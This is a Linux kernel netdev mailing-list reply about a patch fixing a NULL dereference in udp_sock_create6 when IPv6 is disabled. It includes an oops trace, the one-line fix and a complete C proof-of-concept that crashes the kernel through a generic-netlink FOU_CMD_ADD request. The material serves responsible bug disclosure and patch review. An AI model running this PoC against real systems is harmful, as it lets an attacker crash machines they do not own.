Return-Path: <netdev+bounces-267986-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id VDDUI1BVt2lGQAEAu9opvQ
	(envelope-from <netdev+bounces-267986-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Mon, 16 Mar 2026 01:56:48 +0100
X-Original-To: lists+netdev@lfdr.de
Received: from sin.lore.kernel.org (sin.lore.kernel.org [104.64.211.4])
	by mail.lfdr.de (Postfix) with ESMTPS id 92C5E2932A3
	for <lists+netdev@lfdr.de>; Mon, 16 Mar 2026 01:56:47 +0100 (CET)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sin.lore.kernel.org (Postfix) with ESMTP id E45A230046A7
	for <lists+netdev@lfdr.de>; Mon, 16 Mar 2026 00:56:43 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id D363677F39;
	Mon, 16 Mar 2026 00:56:42 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="GPZIc+He"
X-Original-To: netdev@vger.kernel.org
Received: from mail-dy1-f177.google.com (mail-dy1-f177.google.com [74.125.82.177])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 16B7FE571
	for <netdev@vger.kernel.org>; Mon, 16 Mar 2026 00:56:40 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.177
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1773622602; cv=none; b=emSQoKJ0HDin+j4rxKuGai8IVDirh8yb8KEVmyJowEOkLCZuFQVCNUwE2C0s9QXrxUAtrxTCq8Xz1PqDoF4Y7FtG4APjtEhBMl1LW9m7i1grUDAh4AeFJ1d1ukZKcrvHUOWh46rwUmJvQiUgb/XSoPxLlY4r7kmTAIoWgvfB1Co=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1773622602; c=relaxed/simple;
	bh=x2EDjE1xFhd49V9/C6uJ34XKhzUekbvzrLSHY0hbiaI=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=oiF+FShyFebrmNHXM40ImgJ2qormTOoKcZTktk8K9gyJiBeYrSZwdH0ybAWAWujsNhVhQeOt4RH1xfjNjhbxMirxZ3Gcb9igfsSLLwKkt4S6Q2E40r2xti3cGxsf1AoDMmDSNMVnkL5XAo6OsGW6KAdFmJLs2fvf5zYUOQ2Ag24=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=GPZIc+He; arc=none smtp.client-ip=74.125.82.177
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Received: by mail-dy1-f177.google.com with SMTP id 5a478bee46e88-2c0b7eda342so681420eec.1
        for <netdev@vger.kernel.org>; Sun, 15 Mar 2026 17:56:40 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1773622600; x=1774227400; darn=vger.kernel.org;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:from:to
         :cc:subject:date:message-id:reply-to;
        bh=kreb+pyo53p7Jj3AdhSeVwOGqeEOCHuZ11q0hH1YhNA=;
        b=GPZIc+Hez9eiSxqRuvXkLWKgAaFndtGqOgTfZWBb1vgahpNFK+uTgicB1mBEgT26+Q
         KYIyeZ9i0MmS7w8D1FSAR4RcXgCNEXSg5qiI0g6BQ/VPG5SzQ/TITDCdIeA/05gxs4Wr
         MsbdIybYobCHA55oGuRmSwfXLI8QQZgbGQ6llvUMA7QdSv4uBY3UalB3eLSkQ7tmHR1O
         AhWYIM4ZRDi3VWyudE0ab1D0k/SG1oFQTjdDpiSYGpfW/oANUAi6Szc/Lb3OUFmTtFX3
         2RfRHjeD4tMV4dUyscTic8ZqV7PjSZs8Upcg04cK11Bb/vxM03RO+nmaYW7FCYOJ7mHe
         bgQQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1773622600; x=1774227400;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=kreb+pyo53p7Jj3AdhSeVwOGqeEOCHuZ11q0hH1YhNA=;
        b=VmTurL265gu2nFuVy1C9qpjCrgHDRo0uqr4f4v8sDFu8KZvMEn5DuuDCYeegvYQArB
         sbq8+WdDEbP/T9DKr+ToZ3HyMi5v8jWx1ykNe75Vl/2gvmfqbMe6Y0Eg4ywIOmnTe3vq
         bjfoClhqGA2wL5sfxSIXnVFLR3WuLiZocKEaj+ZH//T3WiU5UV6g1plEFVngFYmDwEYd
         bP5AMDx9bfpRKJypD300C6spBJ2SKL6V0fjdYonJ1KSqCTiUTmwNsYiLYq3pHNjT4D4J
         N4KabRZiNRwmoK6FAOfQeC0HlGZ+z/zx8CdagRH3+GoHPIzJr6HH0NxXvRHiCNqLvt3y
         livQ==
X-Gm-Message-State: AOJu0YxqnJ9jXvMMMpQqCzWxAZES5UuMiGuVS2i1JY3dzoRDUB4D6X7F
	1tmX86KYPVeqk++nR3+GO+KCR1o1GbNxZ+cgGYbUME3bkfmqjoq9TD+iiCp5Xnw2gpL6UQoUPan
	HUiA=
X-Gm-Gg: ATEYQzwMg5+fhIjtq5hKH0uOAGaKMgrfrGKp0J/wt+14o9McZ03F9c2cBOFE64J6Td/
	IOVpfGWj73lyNk8HheQVYGonqonElp0rldAtyCn5qFcUkBXQtV706HJSW/SI+PpX4cbQJm4FY3x
	nBvbsUG1FO4G8ZoIDK+jMw9JolX9oY6hGSBsHPZewXVSP60elzhdAV24be+M7oj6n5yWmp7GkC5
	+cmsk9/yz9Qmtg8j0FJy8yOwn+spCGBNdh27zpVCvXUoQok6iBMJECBe6pUh0B6SnFlQdBSu1LP
	vv94JTB0oGybr+rHQaLZhk9Ps/oefnmSvU2uJtvqPeyCevetHiBwYHHtbBfcy1tklOleWC9ji/o
	CpM77lnUtr6gr6dnooh595vtY62PryWoWbjS9BCLTYIv6oMX+AOD3cjABBhFqgriGIXFYNkB8gw
	POboXYcfcFFI0WOoJScu8v80v2cQTTDw==
X-Received: by 2002:a05:7301:1688:b0:2ae:5e93:b69 with SMTP id 5a478bee46e88-2bea55edfafmr4234925eec.29.1773622599687;
        Sun, 15 Mar 2026 17:56:39 -0700 (PDT)
Received: from p1 (209-147-138-15.nat.asu.edu. [209.147.138.15])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-2c0b1fc876csm7033832eec.29.2026.03.15.17.56.39
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 15 Mar 2026 17:56:39 -0700 (PDT)
Date: Sun, 15 Mar 2026 17:56:37 -0700
From: Xiang Mei <xmei5@asu.edu>
To: netdev@vger.kernel.org
Cc: davem@davemloft.net, edumazet@google.com, kuba@kernel.org, 
	pabeni@redhat.com, horms@kernel.org, bestswngs@gmail.com
Subject: Re: [PATCH net] udp_tunnel: fix NULL deref caused by
 udp_sock_create6 when CONFIG_IPV6=n
Message-ID: <a3qk5ehxm3oqwerqglhxjua3msytcboqy2tahg2bo32si2gx6j@npgyyu6eiqcl>
References: <20260316005337.1147633-1-xmei5@asu.edu>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <20260316005337.1147633-1-xmei5@asu.edu>
X-Spamd-Result: default: False [-1.66 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
	MID_RHS_NOT_FQDN(0.50)[];
	R_SPF_ALLOW(-0.20)[+ip4:104.64.211.4:c];
	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	DKIM_TRACE(0.00)[asu.edu:+];
	FROM_HAS_DN(0.00)[];
	TAGGED_FROM(0.00)[bounces-267986-lists,netdev=lfdr.de];
	FREEMAIL_CC(0.00)[davemloft.net,google.com,kernel.org,redhat.com,gmail.com];
	RCVD_TLS_LAST(0.00)[];
	MISSING_XM_UA(0.00)[];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	ASN(0.00)[asn:63949, ipnet:104.64.192.0/19, country:SG];
	TO_DN_NONE(0.00)[];
	RCPT_COUNT_SEVEN(0.00)[7];
	NEURAL_HAM(-0.00)[-1.000];
	TAGGED_RCPT(0.00)[netdev];
	MIME_TRACE(0.00)[0:+]
X-Rspamd-Queue-Id: 92C5E2932A3
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

On Sun, Mar 15, 2026 at 05:53:37PM -0700, Xiang Mei wrote:
> When CONFIG_IPV6 is disabled, the udp_sock_create6() function returns 0
> (success) without actually creating a socket. Callers such as
> fou_create() then proceed to dereference the uninitialized socket
> pointer, resulting in a NULL pointer dereference.
> 
> Return -EPFNOSUPPORT instead, so callers correctly take their error
> paths. There is only one caller of the vulnerable function and only
> privileged users can trigger it.
> 
> The captured NULL deref crash:
> [    0.489638] BUG: kernel NULL pointer dereference, address: 0000000000000018
> [    0.489962] #PF: supervisor read access in kernel mode
> [    0.490193] #PF: error_code(0x0000) - not-present page
> [    0.490435] PGD 102a11067 P4D 102a11067 PUD 102a12067 PMD 0
> [    0.490706] Oops: Oops: 0000 [#1] SMP NOPTI
> [    0.490905] CPU: 0 UID: 0 PID: 140 Comm: exploit Not tainted 7.0.0-rc3+ #2 PREEMPTLAZY
> [    0.491266] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.17.0-0-gb52ca86e094d-prebuilt.qemu.org 04/01/2014
> [    0.491786] RIP: 0010:fou_nl_add_doit (net/ipv4/fou_core.c:590 net/ipv4/fou_core.c:764)
> [    0.492009] Code: c5 48 85 c0 0f 84 04 02 00 00 48 8b 34 24 0f b7 44 24 1c 4c 8d 44 24 30 b9 07 00 00 00 0f b7 54 24 0c 4c 89 c7 48 89 6c 24 28 <4c> 8b 6e 18 66 89 45 0a 0f b6 44 24 10 66 89 55 0e 48 89 75 00 88
> All code
> ========
>    0:	c5 48 85             	(bad)
>    3:	c0 0f 84             	rorb   $0x84,(%rdi)
>    6:	04 02                	add    $0x2,%al
>    8:	00 00                	add    %al,(%rax)
>    a:	48 8b 34 24          	mov    (%rsp),%rsi
>    e:	0f b7 44 24 1c       	movzwl 0x1c(%rsp),%eax
>   13:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
>   18:	b9 07 00 00 00       	mov    $0x7,%ecx
>   1d:	0f b7 54 24 0c       	movzwl 0xc(%rsp),%edx
>   22:	4c 89 c7             	mov    %r8,%rdi
>   25:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
>   2a:*	4c 8b 6e 18          	mov    0x18(%rsi),%r13		<-- trapping instruction
>   2e:	66 89 45 0a          	mov    %ax,0xa(%rbp)
>   32:	0f b6 44 24 10       	movzbl 0x10(%rsp),%eax
>   37:	66 89 55 0e          	mov    %dx,0xe(%rbp)
>   3b:	48 89 75 00          	mov    %rsi,0x0(%rbp)
>   3f:	88                   	.byte 0x88
> 
> Code starting with the faulting instruction
> ===========================================
>    0:	4c 8b 6e 18          	mov    0x18(%rsi),%r13
>    4:	66 89 45 0a          	mov    %ax,0xa(%rbp)
>    8:	0f b6 44 24 10       	movzbl 0x10(%rsp),%eax
>    d:	66 89 55 0e          	mov    %dx,0xe(%rbp)
>   11:	48 89 75 00          	mov    %rsi,0x0(%rbp)
>   15:	88                   	.byte 0x88
> [    0.492846] RSP: 0018:ffffc900004a7a68 EFLAGS: 00010282
> [    0.493095] RAX: 0000000000003201 RBX: 0000000000000000 RCX: 0000000000000007
> [    0.493419] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffffc900004a7a98
> [    0.493754] RBP: ffff888102882180 R08: ffffc900004a7a98 R09: ffff888102882180
> [    0.494084] R10: 0000000000000001 R11: 0000000000000000 R12: ffffc900004a7a90
> [    0.494399] R13: ffff8881008f7a00 R14: ffffc900004a7b20 R15: 0000000000000000
> [    0.494744] FS:  0000000021ac2380(0000) GS:ffff888196dab000(0000) knlGS:0000000000000000
> [    0.495126] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [    0.495385] CR2: 0000000000000018 CR3: 0000000102a0a004 CR4: 0000000000772ef0
> [    0.495723] PKRU: 55555554
> [    0.495861] Call Trace:
> [    0.495990]  <TASK>
> [    0.496101]  genl_family_rcv_msg_doit.constprop.0 (net/netlink/genetlink.c:1114)
> [    0.496362]  genl_rcv_msg (net/netlink/genetlink.c:1194 net/netlink/genetlink.c:1209)
> [    0.496530]  ? __pfx_fou_nl_add_doit (net/ipv4/fou_core.c:755)
> [    0.496757]  ? __pfx_genl_rcv_msg (net/netlink/genetlink.c:1200)
> [    0.496962]  netlink_rcv_skb (net/netlink/af_netlink.c:2550)
> [    0.497153]  genl_rcv (net/netlink/genetlink.c:1219)
> [    0.497299]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1344)
> [    0.497476]  netlink_sendmsg (net/netlink/af_netlink.c:1894)
> [    0.497669]  __sock_sendmsg (net/socket.c:727 (discriminator 1) net/socket.c:742 (discriminator 1))
> [    0.497856]  __sys_sendto (./include/linux/file.h:62 (discriminator 1) ./include/linux/file.h:83 (discriminator 1) net/socket.c:2183 (discriminator 1))
> [    0.498033]  __x64_sys_sendto (net/socket.c:2213 (discriminator 1) net/socket.c:2209 (discriminator 1) net/socket.c:2209 (discriminator 1))
> [    0.498212]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 (discriminator 1) arch/x86/entry/syscall_64.c:94 (discriminator 1))
> [    0.498381]  entry_SYSCALL_64_after_hwframe (net/arch/x86/entry/entry_64.S:130)
> [    0.498610] RIP: 0033:0x41ce17
> [    0.498763] Code: ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b5 0f 1f 00 f3 0f 1e fa 80 3d 4d 62 09 00 00 41 89 ca 74 10 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 69 c3 55 48 89 e5 53 48 83 ec 38 44 89 4d d0
> All code
> ========
>    0:	ff                   	(bad)
>    1:	ff f7                	push   %rdi
>    3:	d8 64 89 02          	fsubs  0x2(%rcx,%rcx,4)
>    7:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
>    e:	eb b5                	jmp    0xffffffffffffffc5
>   10:	0f 1f 00             	nopl   (%rax)
>   13:	f3 0f 1e fa          	endbr64
>   17:	80 3d 4d 62 09 00 00 	cmpb   $0x0,0x9624d(%rip)        # 0x9626b
>   1e:	41 89 ca             	mov    %ecx,%r10d
>   21:	74 10                	je     0x33
>   23:	b8 2c 00 00 00       	mov    $0x2c,%eax
>   28:	0f 05                	syscall
>   2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
>   30:	77 69                	ja     0x9b
>   32:	c3                   	ret
>   33:	55                   	push   %rbp
>   34:	48 89 e5             	mov    %rsp,%rbp
>   37:	53                   	push   %rbx
>   38:	48 83 ec 38          	sub    $0x38,%rsp
>   3c:	44 89 4d d0          	mov    %r9d,-0x30(%rbp)
> 
> Code starting with the faulting instruction
> ===========================================
>    0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
>    6:	77 69                	ja     0x71
>    8:	c3                   	ret
>    9:	55                   	push   %rbp
>    a:	48 89 e5             	mov    %rsp,%rbp
>    d:	53                   	push   %rbx
>    e:	48 83 ec 38          	sub    $0x38,%rsp
>   12:	44 89 4d d0          	mov    %r9d,-0x30(%rbp)
> [    0.499591] RSP: 002b:00007ffd7730d918 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
> [    0.499950] RAX: ffffffffffffffda RBX: 0000000000000001 RCX: 000000000041ce17
> [    0.500272] RDX: 000000000000002c RSI: 00000000004b3b20 RDI: 0000000000000003
> [    0.500585] RBP: 00007ffd7730d970 R08: 00007ffd7730d94c R09: 000000000000000c
> [    0.500923] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffd7730da88
> [    0.501246] R13: 00007ffd7730da98 R14: 00000000004ad868 R15: 0000000000000001
> [    0.501559]  </TASK>
> 
> Fixes: fd384412e199b ("udp_tunnel: Seperate ipv6 functions into its own file.")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  include/net/udp_tunnel.h | 2 +-
>  1 file changed, 1 insertion(+), 1 deletion(-)
> 
> diff --git a/include/net/udp_tunnel.h b/include/net/udp_tunnel.h
> index d9c6d04bb3b5..fc1fc43345b5 100644
> --- a/include/net/udp_tunnel.h
> +++ b/include/net/udp_tunnel.h
> @@ -52,7 +52,7 @@ int udp_sock_create6(struct net *net, struct udp_port_cfg *cfg,
>  static inline int udp_sock_create6(struct net *net, struct udp_port_cfg *cfg,
>  				   struct socket **sockp)
>  {
> -	return 0;
> +	return -EPFNOSUPPORT;
>  }
>  #endif
>  
> -- 
> 2.43.0
>

Thanks for your attention to this bug. It's a NULL-deref can only be
triggered by privileged users.

The following information could help you to reproduce the bug:

1) The required configs:
```
CONFIG_NET_FOU=y
CONFIG_IPV6=n
```

2) PoC source code:
```c
/*
 * FoU NULL deref PoC — CONFIG_IPV6=n + CONFIG_NET_FOU=y
 *
 * FOU_CMD_ADD with AF_INET6 calls udp_sock_create6 stub that returns 0
 * without creating a socket, causing NULL deref in fou_create().
 */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/genetlink.h>
#include <arpa/inet.h>

#define ALIGN4(x) (((x) + 3) & ~3)

enum { FOU_CMD_ADD = 1 };
enum { FOU_ATTR_PORT = 1, FOU_ATTR_AF, FOU_ATTR_IPPROTO };

static char buf[4096];
static int off;

static void nla_put(int type, const void *data, int len) {
    struct nlattr *nla = (struct nlattr *)(buf + off);
    nla->nla_len = NLA_HDRLEN + len;
    nla->nla_type = type;
    memcpy(buf + off + NLA_HDRLEN, data, len);
    off += ALIGN4(nla->nla_len);
}

static int genl_resolve(int fd, const char *name) {
    struct {
        struct nlmsghdr n;
        struct genlmsghdr g;
        struct nlattr a;
        char name[32];
    } req = {
        .n = { .nlmsg_type = GENL_ID_CTRL, .nlmsg_flags = NLM_F_REQUEST },
        .g = { .cmd = CTRL_CMD_GETFAMILY, .version = 1 },
        .a = { .nla_len = NLA_HDRLEN + strlen(name) + 1, .nla_type = CTRL_ATTR_FAMILY_NAME },
    };
    strcpy(req.name, name);
    req.n.nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN) + ALIGN4(req.a.nla_len);

    if (send(fd, &req, req.n.nlmsg_len, 0) < 0) return -1;

    char resp[4096];
    int n = recv(fd, resp, sizeof(resp), 0);
    if (n < 0 || ((struct nlmsghdr *)resp)->nlmsg_type == NLMSG_ERROR) return -1;

    struct nlattr *attr = (struct nlattr *)(resp + NLMSG_HDRLEN + GENL_HDRLEN);
    for (int rem = n - NLMSG_HDRLEN - GENL_HDRLEN; rem >= NLA_HDRLEN; ) {
        if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
            __u16 id;
            memcpy(&id, (char *)attr + NLA_HDRLEN, sizeof(id));
            return id;
        }
        int step = ALIGN4(attr->nla_len);
        if (step < NLA_HDRLEN) break;
        rem -= step;
        attr = (struct nlattr *)((char *)attr + step);
    }
    return -1;
}
int main(void) {
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK,};
    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) { perror("bind"); return 1; }

    int fam = genl_resolve(fd, "fou");
    if (fam < 0) { fprintf(stderr, "[-] Can't resolve 'fou'. CONFIG_NET_FOU=y?\n"); return 1; }

    /* Build FOU_CMD_ADD with AF_INET6 */
    off = NLMSG_HDRLEN + GENL_HDRLEN;
    struct genlmsghdr *genl = (struct genlmsghdr *)(buf + NLMSG_HDRLEN);
    genl->cmd = FOU_CMD_ADD;
    genl->version = 1;

    __u16 port = htons(0x132);
    __u8 af = AF_INET6, proto = 4;
    nla_put(FOU_ATTR_PORT, &port, 2);
    nla_put(FOU_ATTR_AF, &af, 1);
    nla_put(FOU_ATTR_IPPROTO, &proto, 1);

    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    *nlh = (struct nlmsghdr){
        .nlmsg_len = off, .nlmsg_type = fam,
        .nlmsg_flags = NLM_F_REQUEST
    };

    struct sockaddr_nl dst = { .nl_family = AF_NETLINK };
    if (sendto(fd, buf, off, 0, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        perror("sendto"); return 1;
    }
}
```

The intended crash was attached in the commit message. Please let me know
if you have any questions for the patch and poc.

Thanks,
Xiang

